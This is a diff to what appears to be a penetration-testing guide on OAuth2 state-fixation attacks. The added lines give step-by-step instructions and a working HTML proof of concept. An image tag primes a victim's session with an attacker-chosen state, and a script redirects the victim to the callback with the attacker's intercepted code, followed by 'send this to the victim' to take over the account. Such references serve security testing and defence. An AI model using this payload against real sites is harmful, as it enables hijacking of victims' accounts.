@@ -92,4 +92,21 @@ Create an HTML page that will:
 - Pass a valid code with the fixated state
 
 Create a malicious account that will be used for the link, begin the OAuth2 dance but intercept requests and stop before the final redirect with the valid code.  
-Look through the request history for a request that primes the session with a state, e.g. 
+Look through the request history for a request that primes the session with a state, e.g. `http://example.com/users/auth/myprovider?state=<snip>`  
+Next, the final request held in the intercept should have the valid code, e.g. `http://example.com/users/auth/myprovider/callback?code=<snip>&state=<snip>`. Keep this request in the intercept tab.  
+Place both of these URLs into a HTML file:  
+
+```html
+<html>
+        <body>
+                <img src="http://example.com/users/auth/myprovider?state=AAA"> <!-- Prime the targets session to use a specified "state" -->
+                <script>
+                        setTimeout(function() {window.location="http://example.com/users/auth/myprovider/callback?code=<snip>&state=AAA"},2000); <!-- Use the valid code with the malicious state -->
+                </script>
+        </body>
+</html>
+```
+
+Send this to the victim. Once they have clicked the link and a few seconds have gone by,  
+drop the request held in the intercept tab and navigate to the Client server.  
+Link with OAuth2 and hopefully you will have access to the target's account.  
